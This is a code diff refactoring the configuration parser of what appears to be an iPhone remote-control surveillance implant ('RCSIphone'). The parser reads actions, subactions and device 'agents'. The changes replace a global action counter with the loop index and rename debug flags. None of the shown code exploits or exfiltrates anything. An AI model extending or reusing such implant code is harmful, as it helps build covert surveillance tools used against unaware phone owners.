@@ -18,7 +18,6 @@
 #import "RCSICommon.h"
 #import "RCSIUtils.h"
 
-//#define DEBUG_TMP
 //#define DEBUG_VERBOSE_1
 
 #pragma mark -
@@ -71,12 +70,6 @@ typedef struct _eventConf {
 #pragma mark -
 #pragma mark Private Interface
 #pragma mark -
-
-//
-// This is always because of our wonderful (btw do we really need to change it?)
-// configuration file.
-//
-static int actionCounter = 0;
 
 @interface RCSIConfManager (hidden)
 
@@ -178,11 +171,13 @@ static int actionCounter = 0;
     {      
       rawHeader = [NSData dataWithBytes: [aData bytes] + pos
                                  length: sizeof(actionContainerStruct)];
-
       headerContainer = (actionContainerStruct *)[rawHeader bytes];
-
       pos += sizeof(actionContainerStruct);
       
+#ifdef DEBUG_VERBOSE_1
+      NSLog(@"number of subactions: %d", headerContainer->numberOfSubActions);
+#endif
+
       for (z = 0; z < headerContainer->numberOfSubActions; z++)
         {
           rawHeader = [NSData dataWithBytes: [aData bytes] + pos
@@ -205,18 +200,16 @@ static int actionCounter = 0;
               
               [taskManager registerAction: tempData
                                      type: header->type
-                                   action: actionCounter];
+                                   action: i];
             }
           else
             {
               [taskManager registerAction: nil
                                      type: header->type
-                                   action: actionCounter];
+                                   action: i];
               
               pos += sizeof(int) << 1;
             }
-          
-          actionCounter++;
         }
     }
   
@@ -235,7 +228,6 @@ static int actionCounter = 0;
     {
       rawHeader = [NSData dataWithBytes: [aData bytes] + pos
                                  length: sizeof(agentStruct)];
-      
       header = (agentStruct *)[rawHeader bytes];
     
 #ifdef DEBUG_VERBOSE_1
@@ -243,7 +235,7 @@ static int actionCounter = 0;
       NSLog(@"agent size: %x", header->internalDataSize);
 #endif
     
-#ifdef DEBUG_TMP
+#ifdef DEBUG_VERBOSE_1
     if (header->agentID == AGENT_DEVICE)
       NSLog(@"%s: AGENT DEVICE raw header %@", __FUNCTION__, rawHeader);
 #endif 
@@ -264,7 +256,7 @@ static int actionCounter = 0;
               
               memcpy((void*)[tempData bytes], (void*)[aData bytes] + pos + 0xC, sizeof(UInt32)); 
           
-#ifdef DEBUG_TMP
+#ifdef DEBUG_VERBOSE_1
               NSLog(@"%s: AGENT DEVICE additional header %@", __FUNCTION__, tempData);
 #endif
             }
@@ -444,14 +436,11 @@ static int actionCounter = 0;
 {
   NSString *configurationFile;
   
-  // reset the counter
-  actionCounter = 0;
-  
 #ifdef DEV_MODE      
-      //configurationFile = @"/private/var/mobile/RCSIphone/conf_iphone.bin";
-      configurationFile = gConfigurationName;
+  //configurationFile = @"/private/var/mobile/RCSIphone/conf_iphone.bin";
+  configurationFile = gConfigurationName;
 #else    
-      configurationFile = gConfigurationName;
+  configurationFile = gConfigurationName;
 #endif
   
 #ifdef DEBUG
